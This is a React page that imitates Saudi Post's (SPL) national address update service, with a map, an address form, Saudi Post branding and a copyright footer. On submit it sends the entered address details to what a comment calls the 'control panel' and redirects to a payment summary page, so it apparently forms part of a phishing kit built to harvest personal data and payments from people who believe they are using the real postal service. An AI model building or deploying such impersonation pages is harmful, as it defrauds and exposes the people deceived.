import { useState, useEffect, useRef } from "react";
import { Link, useLocation } from "wouter";
import { submitData } from "@/lib/store";

export default function NationalAddress() {
  const [, setLocation] = useLocation();
  
  // Get service name from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'تحديث بيانات العنوان الوطني';
  
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedAddress, setSelectedAddress] = useState("");
  const [city, setCity] = useState("");
  const [district, setDistrict] = useState("");
  const [street, setStreet] = useState("");
  const [building, setBuilding] = useState("");
  const [floor, setFloor] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [mapCenter, setMapCenter] = useState({ lat: 24.7136, lng: 46.6753 }); // Riyadh
  const mapRef = useRef<HTMLDivElement>(null);
  const mapInstanceRef = useRef<any>(null);
  const markerRef = useRef<any>(null);

  // Initialize map
  useEffect(() => {
    // Load Leaflet CSS
    const linkElement = document.createElement('link');
    linkElement.rel = 'stylesheet';
    linkElement.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
    document.head.appendChild(linkElement);

    // Load Leaflet JS
    const script = document.createElement('script');
    script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
    script.onload = () => {
      if (mapRef.current && !mapInstanceRef.current) {
        const L = (window as any).L;
        
        // Initialize map
        mapInstanceRef.current = L.map(mapRef.current).setView([mapCenter.lat, mapCenter.lng], 13);
        
        // Add OpenStreetMap tiles
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
        }).addTo(mapInstanceRef.current);

        // Add marker
        const customIcon = L.divIcon({
          className: 'custom-marker',
          html: `<div style="background-color: #dc2626; width: 30px; height: 30px; border-radius: 50% 50% 50% 0; transform: rotate(-45deg); border: 3px solid white; box-shadow: 0 2px 5px rgba(0,0,0,0.3);"></div>`,
          iconSize: [30, 30],
          iconAnchor: [15, 30]
        });

        markerRef.current = L.marker([mapCenter.lat, mapCenter.lng], { 
          icon: customIcon,
          draggable: true 
        }).addTo(mapInstanceRef.current);

        // Handle marker drag
        markerRef.current.on('dragend', function(e: any) {
          const position = e.target.getLatLng();
          reverseGeocode(position.lat, position.lng);
        });

        // Handle map click
        mapInstanceRef.current.on('click', function(e: any) {
          markerRef.current.setLatLng(e.latlng);
          reverseGeocode(e.latlng.lat, e.latlng.lng);
        });
      }
    };
    document.body.appendChild(script);

    return () => {
      if (mapInstanceRef.current) {
        mapInstanceRef.current.remove();
        mapInstanceRef.current = null;
      }
    };
  }, []);

  // Reverse geocode to get address from coordinates
  const reverseGeocode = async (lat: number, lng: number) => {
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`
      );
      const data = await response.json();
      if (data && data.display_name) {
        setSelectedAddress(data.display_name);
        // Auto-fill fields if available
        if (data.address) {
          setCity(data.address.city || data.address.town || data.address.village || "");
          setDistrict(data.address.suburb || data.address.neighbourhood || "");
          setStreet(data.address.road || "");
          setPostalCode(data.address.postcode || "");
        }
      }
    } catch (error) {
      console.error("Error reverse geocoding:", error);
    }
  };

  // Search for address
  const handleSearch = async () => {
    if (!searchQuery.trim()) return;
    
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(searchQuery + ", Saudi Arabia")}&limit=1`
      );
      const data = await response.json();
      if (data && data.length > 0) {
        const result = data[0];
        const lat = parseFloat(result.lat);
        const lng = parseFloat(result.lon);
        
        // Update map
        if (mapInstanceRef.current && markerRef.current) {
          mapInstanceRef.current.setView([lat, lng], 15);
          markerRef.current.setLatLng([lat, lng]);
        }
        
        setSelectedAddress(result.display_name);
        reverseGeocode(lat, lng);
      }
    } catch (error) {
      console.error("Error searching:", error);
    }
  };

  // Validation states
  const [formErrors, setFormErrors] = useState<string[]>([]);
  const [showErrors, setShowErrors] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate all fields
    const errors: string[] = [];
    
    if (!city.trim()) errors.push('المدينة');
    if (!district.trim()) errors.push('الحي');
    if (!street.trim()) errors.push('الشارع');
    if (!building.trim()) errors.push('رقم المبنى');
    if (!floor.trim()) errors.push('رقم الدور');
    if (!postalCode.trim()) errors.push('الرمز البريدي');
    
    if (errors.length > 0) {
      setFormErrors(errors);
      setShowErrors(true);
      return;
    }
    
    setShowErrors(false);
    
    // إرسال البيانات للوحة التحكم
    submitData({
      'المدينة': city,
      'الحي': district,
      'الشارع': street,
      'رقم المبنى': building,
      'رقم الدور': floor,
      'الرمز البريدي': postalCode,
    });
    
    // Navigate to Summary Payment page with service name
    setLocation(`/summary-payment?service=${encodeURIComponent(serviceName)}`);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
      {/* Header */}
      <header className="bg-[#143c3c] py-2">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            <div></div>
            <a href="#" className="text-white text-xs md:text-sm hover:text-gray-300">English</a>
          </div>
        </div>
      </header>

      {/* Line below header */}
      <div className="h-1.5 md:h-2 bg-[#146c84]"></div>

      {/* Logo */}
      <div className="bg-gray-100 py-3 md:py-4">
        <div className="container mx-auto px-4">
          <div className="max-w-4xl mx-auto flex justify-start">
            <Link to="/">
              <img src="/images/spl-logo.png" alt="سبل" className="h-10 md:h-14 lg:h-16 w-auto" />
            </Link>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-3 md:px-4 py-4 md:py-8">
        <div className="max-w-4xl mx-auto">
          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-8">
            {/* Title */}
            <h1 className="text-xl md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-center mb-4 md:mb-6 lg:mb-8">
              العنوان الوطني
            </h1>

            {/* Map Section */}
            <div className="mb-4 md:mb-6 lg:mb-8">
              <h2 className="text-base md:text-lg font-bold text-[#143c3c] text-right mb-3 md:mb-4">
                عنوان داخل المملكة
              </h2>

              {/* Search Bar */}
              <div className="flex flex-col sm:flex-row gap-2 mb-3 md:mb-4">
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && handleSearch()}
                  placeholder="ابحث عن عنوان في السعودية..."
                  className="flex-1 px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                />
                <button
                  type="button"
                  onClick={handleSearch}
                  className="px-4 md:px-6 py-2.5 md:py-3 bg-[#146c84] text-white font-bold rounded-lg hover:bg-[#0d4a5c] transition-colors text-sm md:text-base"
                >
                  بحث
                </button>
              </div>

              {/* Selected Address Display */}
              {selectedAddress && (
                <div className="flex items-start gap-2 mb-3 md:mb-4 p-2 md:p-3 bg-gray-50 rounded-lg">
                  <svg className="w-4 h-4 md:w-5 md:h-5 text-gray-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                  </svg>
                  <p className="text-xs md:text-sm text-gray-700 text-right" dir="ltr">{selectedAddress}</p>
                </div>
              )}

              {/* Map Container */}
              <div 
                ref={mapRef} 
                className="w-full h-56 md:h-72 lg:h-80 rounded-lg border border-gray-300 mb-3 md:mb-4"
                style={{ zIndex: 1 }}
              ></div>

              {/* Map Instructions */}
              <div className="bg-gray-50 rounded-lg p-3 md:p-4">
                <p className="text-xs md:text-sm text-gray-600 mb-1.5 md:mb-2 flex items-center gap-2">
                  <span className="text-yellow-500">💡</span>
                  <span className="font-bold">يمكنك:</span>
                </p>
                <ul className="text-xs md:text-sm text-gray-600 space-y-0.5 md:space-y-1 mr-4 md:mr-6">
                  <li>• البحث عن عنوان في السعودية</li>
                  <li>• النقر على الخريطة لتحديد موقع</li>
                  <li>• سحب الدبوس لتحريك الموقع</li>
                </ul>
              </div>
            </div>

            {/* Address Form */}
            <form onSubmit={handleSubmit}>
              <h2 className="text-base md:text-lg font-bold text-[#143c3c] text-right mb-4 md:mb-6">
                تفاصيل العنوان
              </h2>

              {/* Error Messages */}
              {showErrors && formErrors.length > 0 && (
                <div className="mb-4 md:mb-6 p-3 md:p-4 bg-red-50 border border-red-300 rounded-lg">
                  <p className="text-red-600 font-bold mb-1.5 md:mb-2 text-right text-sm md:text-base">يرجى إكمال الحقول التالية:</p>
                  <ul className="list-disc list-inside text-red-500 text-xs md:text-sm text-right">
                    {formErrors.map((error, index) => (
                      <li key={index}>{error}</li>
                    ))}
                  </ul>
                </div>
              )}

              {/* City and District Row */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 md:gap-4 mb-3 md:mb-4">
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">المدينة <span className="text-red-500">*</span></label>
                  <input
                    type="text"
                    value={city}
                    onChange={(e) => setCity(e.target.value)}
                    placeholder="المدينة"
                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    required
                  />
                </div>
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">الحي <span className="text-red-500">*</span></label>
                  <input
                    type="text"
                    value={district}
                    onChange={(e) => setDistrict(e.target.value)}
                    placeholder="الحي"
                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    required
                  />
                </div>
              </div>

              {/* Street Row */}
              <div className="mb-3 md:mb-4">
                <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">الشارع <span className="text-red-500">*</span></label>
                <input
                  type="text"
                  value={street}
                  onChange={(e) => setStreet(e.target.value)}
                  placeholder="الشارع"
                  className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                  required
                />
              </div>

              {/* Building, Floor, Postal Code Row */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 md:gap-4 mb-6 md:mb-8">
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">المبنى <span className="text-red-500">*</span></label>
                  <input
                    type="text"
                    value={building}
                    onChange={(e) => setBuilding(e.target.value)}
                    placeholder="رقم المبنى"
                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    required
                  />
                </div>
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">الدور <span className="text-red-500">*</span></label>
                  <input
                    type="text"
                    value={floor}
                    onChange={(e) => setFloor(e.target.value)}
                    placeholder="رقم الدور"
                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    required
                  />
                </div>
                <div>
                  <label className="block text-gray-600 text-xs md:text-sm mb-1.5 md:mb-2 text-right">الرمز البريدي <span className="text-red-500">*</span></label>
                  <input
                    type="text"
                    value={postalCode}
                    onChange={(e) => setPostalCode(e.target.value)}
                    placeholder="الرمز البريدي"
                    className="w-full px-3 md:px-4 py-2 md:py-3 border border-gray-300 rounded-lg text-right focus:outline-none focus:border-[#146c84] text-sm md:text-base"
                    required
                  />
                </div>
              </div>

              {/* Buttons */}
              <div className="flex flex-col-reverse sm:flex-row justify-between items-center gap-3 sm:gap-0">
                {/* Back Button */}
                <Link to="/login" className="w-full sm:w-auto">
                  <button
                    type="button"
                    className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 border-2 border-[#146c84] text-[#146c84] bg-white font-bold rounded-lg hover:bg-[#146c84] hover:text-white transition-colors text-sm md:text-base"
                  >
                    رجوع
                  </button>
                </Link>

                {/* Continue Button */}
                <button
                  type="submit"
                  className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                >
                  متابعة
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#143c3c] py-4 md:py-5 mt-auto">
        <div className="container mx-auto px-3 md:px-4">
          <div className="flex flex-col items-center gap-2 md:gap-0 md:flex-row md:justify-between text-white text-xs md:text-sm">
            <div className="flex items-center gap-1 text-center md:text-right">
              <span>©</span>
              <span>2026 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُبل</span>
            </div>
            <div className="flex flex-wrap items-center justify-center gap-1 text-center">
              <span className="text-gray-300">عند استخدامك هذا الموقع، فإنك توافق على</span>
              <a href="#" className="text-[#04ccf0] hover:underline">شروط الخدمة</a>
              <span className="text-gray-300">و</span>
              <a href="#" className="text-[#04ccf0] hover:underline">سياسة الخصوصية</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
